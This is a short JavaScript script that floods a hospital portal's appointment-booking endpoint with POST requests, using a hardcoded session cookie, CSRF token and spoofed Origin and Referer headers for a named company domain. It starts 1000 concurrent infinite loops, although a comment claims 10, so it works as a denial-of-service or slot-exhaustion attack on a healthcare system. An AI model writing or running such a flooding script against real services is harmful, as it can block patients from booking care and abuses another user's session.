const url = "https://49.13.155.75:8443/hospital/portal/appointments/book/";

const body = new URLSearchParams({
  csrfmiddlewaretoken: "Hkd8tGJHUjkxH0rjLBeeNgoVHfX7aWz3LkWNiLLeYErImm428t0Oe87CEpqq4phJ",
  department: "1",
  doctor: "9",
  appointment_date: "2026-08-21",
  appointment_time: "05:20",
  chief_complaint: ""
});

async function sendRequest() {
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "csrftoken=eaTPZfcHevhlPwNTx2WKB2TR7kDt4DSQ; sessionid=bniu2glsq7jfxebj1qji7u29j3k7jsj6",
        "Origin": "https://proterra.cleferp.com",
        "Referer": "https://proterra.cleferp.com/hospital/portal/appointments/book/"
      },
      body
    });

    console.log(response.status);
  } catch (err) {
    console.error(err.message);
  }
}

async function worker() {
  while (true) {
    await sendRequest();
  }
}

// 10 concurrent workers
for (let i = 0; i < 1000; i++) {
  worker();
}
